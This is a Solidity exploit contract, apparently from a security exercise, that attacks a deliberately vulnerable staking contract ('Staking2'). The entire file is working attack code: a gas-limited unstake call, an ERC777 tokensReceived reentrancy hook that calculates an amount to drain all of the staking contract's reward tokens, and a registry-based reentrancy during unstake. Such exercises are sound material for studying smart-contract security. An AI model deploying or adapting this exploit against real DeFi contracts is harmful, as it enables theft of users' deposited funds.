//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import {Staking2, IERC20} from "../vulnerable/Staking2.sol";
import {IERC777} from "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import {IERC777Recipient} from "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import {IERC1820Registry} from "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";

contract Staking2Attack is IERC777Recipient, Context {
    IERC1820Registry public constant REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 public constant RECIPIENT_INTERFACE = keccak256("ERC777TokensRecipient");
    Staking2 public immutable STAKING;
    IERC20 public immutable REWARDS;
    uint256 public immutable FEE_DENOM;

    constructor(Staking2 staking) {
        STAKING = staking;
        REWARDS = staking.REWARDS();
        FEE_DENOM = staking.FEE_DENOM();
    }

    function setUpOne(IERC20 token) external {
        REWARDS.approve(address(STAKING), REWARDS.balanceOf(address(this)));
        STAKING.addReward(token, 1 wei);
        token.approve(address(STAKING), token.balanceOf(address(this)));
        STAKING.stake(token, 1 wei);
    }

    function attackOne(IERC20 token, uint256 gas) external {
        STAKING.addReward(token, 1 wei);
        (bool success, ) = address(STAKING).call{gas: gas}(
            abi.encodeWithSelector(STAKING.unstake.selector, token, 1 wei)
        );
        require(success, "Staking2Attack: unstake reverted (send more gas)");
        (bool badlyBehaved, ) = STAKING.tokenInfo(token);
        require(badlyBehaved, "Staking2Attack: attack failed (send less gas)");
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        require(to == address(this) && userData.length == 0 && operatorData.length == 0);
        if (operator == address(STAKING) && from == address(STAKING)) {
            uint256 beforeBalance = REWARDS.balanceOf(address(this));
            IERC20 token = IERC20(_msgSender());

            uint248 wipeout;
            {
                (bool feeExempt, uint248 lastReward, uint256 stake) = STAKING.stakerInfo(token, address(this));
                require(amount == stake, "Staking2Attack: partial unstake");
                uint256 tokenBalance = token.balanceOf(address(STAKING));
                uint256 rewardBalance = REWARDS.balanceOf(address(STAKING));
                // This is the amount to be added such that when we call
                // `sendReward`, we get *exactly* all of `STAKING`'s balance
                if (feeExempt) {
                    wipeout = uint248((tokenBalance * rewardBalance + lastReward * stake) / (stake - tokenBalance));
                } else {
                    wipeout = uint248(
                        (FEE_DENOM * tokenBalance * rewardBalance + (FEE_DENOM - 1) * lastReward * stake) /
                            ((FEE_DENOM - 1) * stake - FEE_DENOM * tokenBalance)
                    );
                }
            }
            REWARDS.approve(address(STAKING), wipeout);
            STAKING.addReward(token, wipeout);

            STAKING.sendReward(token, address(this));
            require(REWARDS.balanceOf(address(this)) > beforeBalance, "Staking2Attack: attack failed - no profit");
            require(REWARDS.balanceOf(address(STAKING)) == 0, "Staking2Attack: no wipeout");
        }
    }

    function attackTwo(IERC777 token) external {
        IERC20 token20 = IERC20(address(token));
        uint256 beforeBalance = token.balanceOf(address(this));
        token20.approve(address(STAKING), beforeBalance);
        STAKING.stake(token20, beforeBalance);

        REGISTRY.setInterfaceImplementer(address(0), RECIPIENT_INTERFACE, address(this));
        STAKING.unstake(token20, beforeBalance);
        require(token.balanceOf(address(this)) >= beforeBalance, "Staking2Attack: attack failed - lost stake");
    }
}
